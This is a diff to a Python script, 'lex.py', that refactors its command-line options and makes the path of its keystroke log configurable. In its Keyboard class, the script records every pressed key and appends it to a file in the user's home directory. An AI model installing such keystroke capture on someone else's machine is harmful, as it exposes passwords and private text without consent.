@@ -31,37 +31,32 @@
 #                                                                              #
 ################################################################################
 
-The configuration (file) should feature a Markdown list of the following form:
-
-- event-execution-map
-   - <event, e.g. shift-left>
-      - description: <natural language description, e.g. say hello world>
-      - command: <command, e.g. echo "hello world" | festival --tts>
-
 Usage:
     lex.py [options]
 
 Options:
-    -h, --help               display help message
-    --version                display version and exit
-    -v, --verbose            verbose logging
-    -s, --silent             silent
-    -u, --username=USERNAME  username
+    -h, --help           display help message
+    --version            display version and exit
+    --verbose            verbose logging
+    --silent             silent
+    --username=USERNAME  username
+    --logfile=FILE       log filename at home directory [default: .lexlog.txt]
 """
 
 name    = "lex"
-version = "2016-02-20T0918Z"
+version = "2016-09-06T1759Z"
 logo    = None
 
-import os
-import sys
-import time
 import ctypes
 import ctypes.util
 import docopt
-import shijian
+import os
+import sys
+import time
+
 import propyte
 import pyprel
+import shijian
 
 def main(options):
 
@@ -71,9 +66,12 @@ def main(options):
         name    = name,
         version = version,
         logo    = logo
-        )
+    )
     global log
     from propyte import log
+
+    global filename_log
+    filename_log = options["--logfile"]
 
     log.info("")
 
@@ -265,8 +263,9 @@ class Keyboard:
 
     def log_loop(self):
 
-        log_filename = "/home/{username}/.lexlog.txt".format(
-            username = program.username
+        log_filename = "/home/{username}/{filename}".format(
+            username = program.username,
+            filename = filename_log
         )
         
         while True:
@@ -278,10 +277,8 @@ class Keyboard:
                 #))
                 #print(pressed_keys, end = "")
                 print pressed_keys,
-                with open(log_filename, "a") as logFile:
-                    logFile.write(pressed_keys)
-
-
+                with open(log_filename, "a") as file_log:
+                    file_log.write(pressed_keys)
 
 if __name__ == "__main__":
     options = docopt.docopt(__doc__)
